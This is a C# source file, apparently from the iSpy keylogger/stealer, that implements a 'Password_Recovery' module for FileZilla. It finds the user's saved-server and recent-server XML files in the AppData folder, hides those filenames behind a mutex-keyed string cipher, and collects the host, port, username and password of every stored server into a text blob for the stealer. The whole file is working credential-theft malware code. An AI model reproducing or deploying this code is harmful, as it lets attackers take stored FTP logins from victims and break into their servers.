using System;
using System.Collections.Generic;
using System.Text;
using System.Xml;
using System.IO;
namespace iSpy.Password_Recovery
{
    public class FileZilla
    {
        private static string[] strFilenames = new string[2];
        private static string strFolderPath;

        public static string Recover()
        {
            strFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla";
            strFilenames[0] = StringCipher.Decrypt("[SITEMANAGER]", Config.MUTEX);
            strFilenames[1] = StringCipher.Decrypt("[RECENTSERVERS]", Config.MUTEX);
            string structure = string.Empty;
            try
            {
                foreach (string strFilename in strFilenames)
                {
                    string strPath = Path.Combine(strFolderPath, strFilename);
                    if (File.Exists(strPath))
                    {
                        structure += Read(strPath);
                    }
                }
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, null); }
            return structure;
        }

        private static string Read(string path)
        {
            string structure = string.Empty;
            try
            {
                XmlDocument objXmlDocument = new XmlDocument();
                objXmlDocument.Load(path);
                foreach (XmlNode objXmlNode in objXmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
                {
                    structure += "[FileZilla]" + Environment.NewLine;
                    structure += ("Host: " + objXmlNode.ChildNodes[0].InnerText) + Environment.NewLine;
                    structure += ("Port: " + objXmlNode.ChildNodes[1].InnerText) + Environment.NewLine;
                    structure += ("User: " + objXmlNode.ChildNodes[4].InnerText) + Environment.NewLine;
                    structure += ("Pass: " + objXmlNode.ChildNodes[5].InnerText) + Environment.NewLine;
                    structure += Environment.NewLine;
                }
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, null); }
            return structure;
        }
    }
}
